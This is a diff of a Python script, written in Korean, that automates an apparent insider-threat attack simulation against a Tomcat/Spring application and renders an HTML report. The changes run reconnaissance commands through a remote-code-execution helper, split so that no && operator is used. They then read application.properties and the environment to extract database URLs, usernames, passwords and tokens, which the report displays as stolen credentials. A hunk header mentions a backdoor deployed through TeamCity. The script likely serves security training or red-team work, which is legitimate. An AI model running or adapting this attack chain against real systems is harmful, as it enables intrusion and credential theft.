@@ -132,7 +132,11 @@ def main():
     step("1", "정찰 (Reconnaissance) — 내부 환경 파악")
     info("내부자가 접근 가능한 시스템과 네트워크 구조를 파악합니다.")
 
-    recon_result = execute_rce("id && hostname && uname -a")
+    # Phase 1 정찰 (상태 확인) — && 연산자 대신 독립적 RCE 요청으로 분리
+    recon_id       = execute_rce("id")
+    recon_hostname = execute_rce("hostname")
+    recon_uname    = execute_rce("uname -a")
+    recon_result   = f"{recon_id}  hostname={recon_hostname}  {recon_uname}"
     if recon_result and "uid=" in recon_result:
         ok(f"내부 시스템 정보 획득 성공!")
         info(f"접속 환경: {recon_result[:120]}")
@@ -200,29 +204,63 @@ def main():
     step("3", "크리덴셜 수집 (Credential Harvesting) — 하드코딩된 DB 정보")
     info("RCE를 통해 Spring 서버 내 소스코드에서 하드코딩된 DB 접속 정보를 추출합니다.")
 
-    # application.properties 탐색
-    cred_search = execute_rce("find /usr/local/tomcat -name 'application.properties' 2>/dev/null | head -3")
-    env_dump = execute_rce("env | grep -i 'spring\\|db\\|datasource\\|password\\|user'")
-    ssh_password = ""
-    for line in env_dump.split("\n"):
-        if "SSH_PASSWORD" in line or "PASSWORD" in line:
-            ssh_password = line.strip()
-            break
+    # application.properties에서 직접 DB 크리덴셜 추출 (파이프 없이)
+    props_raw = execute_rce("cat /usr/local/tomcat/webapps/spring-form/WEB-INF/classes/application.properties")
+    # 환경변수 전체 획득 (파이프 없이) — Python에서 필터링
+    env_raw = execute_rce("env")
+    
+    # Python에서 필터링
+    cred_keywords = ["spring", "db", "datasource", "password", "user", "host", "token"]
+    env_filtered = "\n".join(
+        line for line in env_raw.split("\n")
+        if any(kw in line.lower() for kw in cred_keywords)
+    )
 
-    if env_dump and env_dump.strip():
-        ok(f"내부 환경변수에서 크리덴셜 탈취 성공!")
-        info(f"발견된 민감 정보: {env_dump[:150]}")
+    # application.properties 파싱
+    db_creds = {}
+    if props_raw:
+        for line in props_raw.split("\n"):
+            line = line.strip()
+            if "spring.datasource.url=" in line:
+                db_creds["url"] = line.split("=", 1)[1].strip()
+            elif "spring.datasource.username=" in line:
+                db_creds["user"] = line.split("=", 1)[1].strip()
+            elif "spring.datasource.password=" in line:
+                db_creds["pass"] = line.split("=", 1)[1].strip()
+
+    # 소스코드 설정 파일 위치 탐색
+    cred_search = execute_rce("find /usr/local/tomcat -name application.properties 2>/dev/null")
+
+    if db_creds.get("pass") or env_filtered.strip():
+        ok("내부 환경변수에서 크리덴셜 탈취 성공!")
+        if db_creds.get("url"):
+            info(f"DB URL : {db_creds.get('url')}")
+            info(f"DB USER: {db_creds.get('user')}")
+            info(f"DB PASS: {db_creds.get('pass')}")
         results["phase3"] = True
         details["phase3"] = f"""
-<strong>탈취된 크리덴셜 정보 (환경변수 덤프):</strong>
-<pre>{env_dump[:400]}</pre>
-<p>소스코드 설정 파일 검색 결과:</p>
-<pre>{cred_search}</pre>
+<strong>📄 application.properties 설정 파일 원문:</strong>
+<pre>{props_raw[:600]}</pre>
+
+<strong>🔑 탈취된 DB 접속 크리덴셜:</strong>
+<ul>
+  <li>DB URL : <span style="color:#ef4444;font-weight:bold">{db_creds.get('url', '미발견')}</span></li>
+  <li>USER   : <span style="color:#ef4444;font-weight:bold">{db_creds.get('user', '미발견')}</span></li>
+  <li>PASS   : <span style="color:#ef4444;font-weight:bold">{db_creds.get('pass', '미발견')}</span></li>
+</ul>
+
+<strong>🖥️ 환경변수 중 민감 정보 (필터링):</strong>
+<pre>{env_filtered[:400] if env_filtered.strip() else "(환경변수에서 해당 항목 없음)"}</pre>
+
+<p>설정 파일 검색 경로: <code>{cred_search[:200]}</code></p>
 """
     else:
         warn("환경변수에서 크리덴셜을 찾지 못했습니다.")
         results["phase3"] = False
-        details["phase3"] = "환경변수 내에서 DB 접속 정보를 찾지 못했습니다."
+        details["phase3"] = f"""환경변수 내에서 DB 접속 정보를 찾지 못했습니다.
+<pre>{env_raw[:300]}</pre>
+<p>설정 파일 검색 결과: <code>{cred_search}</code></p>"""
+
 
     # ══════════════════════════════════════════════════════════
     # Phase 4: 내부 DB 접근 (Lateral Movement)
@@ -356,7 +394,7 @@ TeamCity가 자동으로 빌드/배포하면 프로덕션 서버에 백도어가
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>내부자 위협 시뮬레이션 — 자동 실행 보고서</title>
+<title>[서브 시나리오] 내부자 위협 시뮬레이션 자동 실행 보고서</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
@@ -519,7 +557,7 @@ pre {{
 
     report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "03.FinalReport")
     os.makedirs(report_dir, exist_ok=True)
-    report_filename = f"insider_threat_report_{now.strftime('%Y%m%d_%H%M%S')}.html"
+    report_filename = f"sub_scenario_insider_threat_{now.strftime('%Y%m%d_%H%M%S')}.html"
     report_path = os.path.join(report_dir, report_filename)
 
     with open(report_path, "w", encoding="utf-8") as f:
